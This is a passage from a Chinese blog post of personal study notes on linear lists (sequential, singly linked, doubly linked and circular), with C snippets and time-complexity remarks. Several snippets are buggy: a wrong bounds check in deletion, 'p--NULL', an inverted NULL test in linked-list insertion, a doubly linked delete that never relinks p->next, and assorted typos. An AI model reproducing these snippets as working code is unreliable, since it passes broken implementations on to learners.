class="type">bool</span> <span class="title function_">deletelist</span><span class="params">(sqlist &amp;L,<span class="type">int</span> i,<span class="type">int</span> &amp;e)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(e&lt;i||e&gt;L.length)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j=i;j&lt;=L.length;j++)</span><br><span class="line">		L.data[j<span class="number">-1</span>]=L.data[j];</span><br><span class="line">	L.length--;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	sqlist L;</span><br><span class="line">	<span class="type">int</span> L[maxsize]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">	<span class="type">int</span> e=<span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">if</span>(deletelist(L,<span class="number">3</span>,e))</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;删除的第三个位置的值为%d\n&quot;</span>,e);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;删除失败&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>删除操作的时间复杂度为O（n）</p>
<h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518161558034.png" alt="image-20220518161558034"></p>
<h4 id="按位查找"><a href="#按位查找" class="headerlink" title="按位查找"></a>按位查找</h4><p>GetElem(L,i):按位查找操作。获取表L中第i个位置的元素的值。</p>
<h5 id="静态分配"><a href="#静态分配" class="headerlink" title="静态分配"></a>静态分配</h5><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518161802282.png" alt="image-20220518161802282"></p>
<h5 id="动态分配"><a href="#动态分配" class="headerlink" title="动态分配"></a>动态分配</h5><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518162027212.png" alt="image-20220518162027212"></p>
<p>malloc申请空间返回的指针与前面设置的指针数据类型应该相同</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518162350193.png" alt="image-20220518162350193"></p>
<p>最好/最坏/平均时间复杂度：O(1)</p>
<h4 id="按值查找"><a href="#按值查找" class="headerlink" title="按值查找"></a>按值查找</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518162644686.png" alt="image-20220518162644686"></p>
<h5 id="结构类型的比较"><a href="#结构类型的比较" class="headerlink" title="结构类型的比较"></a>结构类型的比较</h5><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518162852560.png" alt="image-20220518162852560"></p>
<p>正确处理方式</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (a.num == b.num &amp;&amp; a.people == b.people) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;true&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">pritf(<span class="string">&quot;false&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">isCustomerEqual</span> <span class="params">(Customer a,Customer b)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a.num == b.num &amp;&amp; a.people ==b.people)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>按值查找的时间复杂度</p>
<script type="math/tex; mode=display">
最好时间复杂度:O(1)
最坏时间复杂度:O(n)
平均时间复杂度:O(n)</script><h2 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h2><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518210935623.png" alt="image-20220518210935623"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span>                <span class="comment">//定义单链表节点类型</span></span><br><span class="line">    ElemType data;           <span class="comment">//每个节点存放一个数据元素</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span>      <span class="comment">//指针指向像一个节点</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">p</span> =</span> (<span class="keyword">struct</span> LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> LNode));                     <span class="comment">//增加一个新的节点：在内存中申请一个节点所需空间，并用指针p指向这个节点</span></span><br></pre></td></tr></table></figure>
<p>typedef 关键字 —— 数据类型重命名</p>
<p>typedef &lt;数据类型&gt;&lt;别名&gt;</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518211715052.png" alt="image-20220518211715052"></p>
<p> <img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518211913545.png" alt="image-20220518211913545"></p>
<p>LNode * ：表示return的时一个节点</p>
<p>LinkList L：强调是一个单链表L</p>
<h4 id="不带头节点的单链表"><a href="#不带头节点的单链表" class="headerlink" title="不带头节点的单链表"></a>不带头节点的单链表</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518212144006.png" alt="image-20220518212144006"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518212155476.png" alt="image-20220518212155476"></p>
<p>是否为空的判断是头节点是否为NULL</p>
<h4 id="带头结点的单链表"><a href="#带头结点的单链表" class="headerlink" title="带头结点的单链表"></a>带头结点的单链表</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518212310388.png" alt="image-20220518212310388"></p>
<p>不带头节点的单链表在头指针后的data就开始存储数据，带头节点的单链表的第二个节点不存储数据，为NULL</p>
<h3 id="插入和删除"><a href="#插入和删除" class="headerlink" title="插入和删除"></a>插入和删除</h3><h4 id="按位序插入"><a href="#按位序插入" class="headerlink" title="按位序插入"></a>按位序插入</h4><p>带头结点</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519145908546.png" alt="image-20220519145908546"></p>
<p>if i = 6 : p指向NULL，则第i-1节点不存在，直接返回false</p>
<p>时间复杂度：O(n)</p>
<p>不带头节点</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519150604589.png" alt="image-20220519150604589"></p>
<p>不带头结点需要一段单独的代码来应对i=1的情况</p>
<h4 id="指定节点的后插操作"><a href="#指定节点的后插操作" class="headerlink" title="指定节点的后插操作"></a>指定节点的后插操作</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,* LinkList</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InserNextNode</span> <span class="params">(LNode *p ,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode *s = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    <span class="keyword">if</span>(s==<span class="literal">NULL</span>)               <span class="comment">//内存分配失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    s-&gt;data = e;              <span class="comment">//结点s保存数据元素e</span></span><br><span class="line">    s-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next = s;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ListInsert</span><span class="params">(LinkList &amp;L,<span class="type">int</span> i,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i&lt;<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	LNode *p;</span><br><span class="line">   	<span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">	p = L;</span><br><span class="line">	<span class="keyword">while</span> (p! = <span class="literal">NULL</span> &amp;&amp; j&lt;i<span class="number">-1</span>)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j++</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> InsertNextNode(p,e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间复杂度：O(1)</p>
<h4 id="前插操作"><a href="#前插操作" class="headerlink" title="前插操作"></a>前插操作</h4><p>两种方法：（1)传入头节点，依次遍历（2）采用后插方式，将节点p的值赋给新申请的节点，将插入的值赋给节点p</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">insertpriornode</span> <span class="params">(LNode *p, ElemTyoe e)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode *s = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    <span class="keyword">if</span>(s==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    s-&gt;next=p-&gt;next;</span><br><span class="line">    p-&gt;next=s;            <span class="comment">//新结点s连到p结点后</span></span><br><span class="line">    s-&gt;data=p-&gt;data;      <span class="comment">//将p中元素赋值给s</span></span><br><span class="line">    p-&gt;data=e;            <span class="comment">//p中元素覆盖为e</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519153009590.png" alt="image-20220519153009590"></p>
<p>时间复杂度：O(1)</p>
<h4 id="按位序删除"><a href="#按位序删除" class="headerlink" title="按位序删除"></a>按位序删除</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519154105544.png" alt="image-20220519154105544"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">listdelete</span><span class="params">(linklist &amp;L,<span class="type">int</span> i,elemtype &amp;e)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    lnode *p;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    p = L;</span><br><span class="line">    <span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; j&lt;i<span class="number">-1</span>)&#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;next == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    lnode *q=p-&gt;next;</span><br><span class="line">    e = q-&gt;data;</span><br><span class="line">    p-&gt;next=q-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最好时间复杂度：O(1)</p>
<p>最坏/平均时间复杂度：O(n)</p>
<h4 id="指定节点的删除"><a href="#指定节点的删除" class="headerlink" title="指定节点的删除"></a>指定节点的删除</h4><p>下面例子为带头结点的单链表</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">deletenode</span> <span class="params">(lnode *p)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p--<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    lnode *q = p-&gt;next;</span><br><span class="line">    p-&gt;data = p-&gt;next-&gt;data;</span><br><span class="line">    p-&gt;next=q-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间复杂度：O(1)</p>
<p>如果p是最后一个节点，只能依次寻找p的前驱，时间复杂度为O(n)</p>
<h3 id="单链表的查找"><a href="#单链表的查找" class="headerlink" title="单链表的查找"></a>单链表的查找</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519162949205.png" alt="image-20220519162949205"></p>
<h4 id="按位查找-1"><a href="#按位查找-1" class="headerlink" title="按位查找"></a>按位查找</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LNode * <span class="title function_">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    LNode *p;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    p = L;</span><br><span class="line">    <span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; j&lt;i)&#123;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">    	j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="按值查找-1"><a href="#按值查找-1" class="headerlink" title="按值查找"></a>按值查找</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LNode * <span class="title function_">LocateElem</span><span class="params">(LinkList L,ElemType e)</span>&#123;</span><br><span class="line">    LNode *p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; p-&gt;data != e)</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>平均时间复杂度：O(n)</p>
<h4 id="求表长"><a href="#求表长" class="headerlink" title="求表长"></a>求表长</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Length</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">	<span class="type">int</span> len =<span class="number">0</span>;           <span class="comment">//统计表长</span></span><br><span class="line">	LNode *p = L;</span><br><span class="line">	<span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">		len++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间复杂度：O(n)</p>
<h3 id="单链表的建立"><a href="#单链表的建立" class="headerlink" title="单链表的建立"></a>单链表的建立</h3><h4 id="尾插法"><a href="#尾插法" class="headerlink" title="尾插法"></a>尾插法</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">	ElemType data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化一个单链表</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitList</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">    L = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode)); <span class="comment">//分配一个头结点L</span></span><br><span class="line">    <span class="keyword">if</span>(L==<span class="literal">NULL</span>)                         <span class="comment">//内存不足分配失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;                     <span class="comment">//头结点之后暂时还没有结点</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    LinkList L;  <span class="comment">//声明一个指向单链表的指针L</span></span><br><span class="line">    <span class="comment">//初始化一个空表</span></span><br><span class="line">    InitList(L);</span><br><span class="line">    <span class="comment">//······</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519170717022.png" alt="image-20220519170717022"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">ListInsert</span><span class="params">(LinkList &amp;L,<span class="type">int</span> i,ElemType e)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode *p;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    p = L;</span><br><span class="line">    <span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; j&lt;i<span class="number">-1</span>)&#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode *s = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    s-&gt;data = e;</span><br><span class="line">    s-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next = s;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>&#123;</span><br><span class="line">    ListInsert(L,length+<span class="number">1</span>,e);</span><br><span class="line">    length++</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
时间复杂度:O(n^2)</script><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LinkList <span class="title function_">List_TailInsert</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode)); <span class="comment">//初始化空表</span></span><br><span class="line">    LNode *s,*r=L;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x!=<span class="number">9999</span>)&#123;</span><br><span class="line">        s=(LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));  <span class="comment">//在r结点之后插入元素x</span></span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        r-&gt;next=s;</span><br><span class="line">        r=s;                             <span class="comment">//永远保持r指向最后一个结点</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next=<span class="literal">NULL</span>;                <span class="comment">//尾结点指针置空</span></span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519172020891.png" alt="image-20220519172020891"></p>
<p>时间复杂度：O(n)</p>
<h4 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">		LNode *s;</span><br><span class="line">		<span class="type">int</span> x;</span><br><span class="line">		L=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));  <span class="comment">//创建头结点</span></span><br><span class="line">		L-&gt;next = <span class="literal">NULL</span>;                     <span class="comment">//初始化为空链表</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">		<span class="keyword">while</span>(x!=<span class="number">9999</span>)&#123;                     <span class="comment">//输入9999表示结束</span></span><br><span class="line">			s = (LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">			s-&gt;data=x;</span><br><span class="line">			s-&gt;next=L-&gt;next</span><br><span class="line">			L-&gt;next=s;                     <span class="comment">//将新结点插入表中，L为头指针</span></span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>（ps：L-&gt;next = NULL是为了避免以前遗留的脏数据）</p>
<p>应用：链表的逆置 </p>
<h2 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h2><h3 id="初始化（带头结点）"><a href="#初始化（带头结点）" class="headerlink" title="初始化（带头结点）"></a>初始化（带头结点）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> *<span class="title">prior</span>,*<span class="title">next</span>;</span></span><br><span class="line">&#125;DNode,*DlinkList;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitDLinkList</span><span class="params">(DLinkList &amp;L)</span>&#123;</span><br><span class="line">    L = (DNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DNode));</span><br><span class="line">    <span class="keyword">if</span>(L==null)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    L-&gt;prior = null;</span><br><span class="line">    L-&gt;next = null;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testDLinkList</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">    DLinkList L;</span><br><span class="line">    InitDLinkList(L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519174125025.png" alt="image-20220519174125025"></p>
<h3 id="插入-1"><a href="#插入-1" class="headerlink" title="插入"></a>插入</h3><p>后插操作</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519174230546.png" alt="image-20220519174230546"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519174327671.png" alt="image-20220519174327671"></p>
<p>前插操作：通过双链表的特性可以找到插入位置的前一个结点，再对该结点进行后插操作</p>
<h3 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a>删除</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">DeketeNextDNode</span><span class="params">(DNode *p)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (p==null)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    DNode *q = p-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(q==null)          <span class="comment">//p没有后继</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;next!=null)</span><br><span class="line">        q-&gt;next-&gt;prior=p;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="销毁双链表"><a href="#销毁双链表" class="headerlink" title="销毁双链表"></a>销毁双链表</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DestoryList</span><span class="params">(DLinklist &amp;L)</span>&#123;</span><br><span class="line">    <span class="comment">//循环释放各个数据结点</span></span><br><span class="line">    <span class="keyword">while</span> (L-&gt;next != null)</span><br><span class="line">        DeleteNextDNode(L);</span><br><span class="line">    <span class="built_in">free</span>(L);   <span class="comment">//释放头结点</span></span><br><span class="line">    L=null;    <span class="comment">//头指针指向null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><h4 id="后向遍历"><a href="#后向遍历" class="headerlink" title="后向遍历"></a>后向遍历</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(p!=null)&#123;</span><br><span class="line">    <span class="comment">//对结点p做相应处理，eg按位查找按值查找打印等</span></span><br><span class="line">    p=p-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="前向遍历"><a href="#前向遍历" class="headerlink" title="前向遍历"></a>前向遍历</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(p-&gt;prior != null)&#123;</span><br><span class="line">	p=p-&gt;prior;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间复杂度:O(n)</p>
<h2 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h2><p>分为：循环单链表，循环双链表</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519201322333.png" alt="image-20220519201322333"></p>
<h3 id="循环单链表"><a href="#循环单链表" class="headerlink" title="循环单链表"></a>循环单链表</h3><h4 id="定义循环单链表"><a href="#定义循环单链表" class="headerlink" title="定义循环单链表"></a>定义循环单链表</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span>         <span class="comment">//定义单链表结点类型</span></span><br><span class="line">	ElemType data;            <span class="comment">//每个结点存放一个数据元素</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span>       <span class="comment">//指针指向下一个结点</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化一个循环单链表</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitList</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">    L = (LNode * )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));   <span class="comment">//分配一个头结点</span></span><br><span class="line">    <span class="keyword">if</span>(L==null)                 <span class="comment">//内存不足分配失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    L-&gt;next=L;                   <span class="comment">//头结点next指向头结点</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//判断循环单链表是否为空</span></span><br><span class="line"><span class="type">bool</span> Empty(LinkList L)&#123;</span><br><span class="line">	<span class="keyword">if</span>(L-&gt;next == 	L)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 